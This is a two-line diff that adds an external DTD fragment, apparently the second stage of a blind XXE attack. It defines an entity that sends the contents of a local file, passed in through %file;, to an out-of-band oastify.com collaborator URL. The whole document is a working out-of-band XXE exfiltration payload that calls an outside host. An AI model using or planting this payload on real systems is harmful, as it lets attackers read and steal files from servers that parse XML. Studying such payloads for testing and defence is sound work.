@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY exfil SYSTEM 'https://hm76u0ieb6a8cbanepzmyawwnnteh6ju8.oastify.com/exfil?data=%start;%file;%end;'>">
+%all;
